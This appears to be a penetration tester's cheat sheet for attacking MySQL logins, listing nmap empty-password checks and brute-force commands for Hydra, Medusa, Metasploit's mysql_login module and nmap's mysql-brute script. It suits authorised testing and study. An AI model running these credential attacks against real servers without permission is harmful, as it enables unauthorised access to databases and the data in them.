# MySQL

Search Tag(s): #initial-access #password-cracking #network-protocols #network-mapper

## 01 - Empty Password

> [!WARNING] Proceed with Caution!
> Often times you may see honeypots without credentials set, so be skeptical!

```
$ nmap -p 3306 --script mysql-empty-password <IP>
```

## 02 - Brute Force

### 2.1 - Hydra

```
$ hydra -V -l root -p <password> mysql
```

### 2.2 - Medusa

```
$ medusa -h <IP> -u <username> -P passwords.lst -f -t 4 -M mysql
```

### 2.3 - Metasploit

```
msf > use auxiliary/scanner/mysql/mysql_login

msf auxiliary(scanner/mysql/mysql_login) > options 

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME          root             no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/mysql/mysql_login) > set username <username>

msf auxiliary(scanner/mysql/mysql_login) > set user_file /path/to/users.lst

msf auxiliary(scanner/mysql/mysql_login) > set pass_file /path/to/passwords.lst

msf auxiliary(scanner/mysql/mysql_login) > set threads 2

msf auxiliary(scanner/mysql/mysql_login) > run -j
```

### 2.4 - Network Mapper

```
$ nmap -p 3306 --script mysql-brute --script-args "userdb=users.lst,passdb=passwords.lst" <IP>
```

---
## References

### Hacking Articles

- [Hacking Articles: Nmap for Pentester Password Cracking](https://www.hackingarticles.in/nmap-for-pentester-password-cracking/)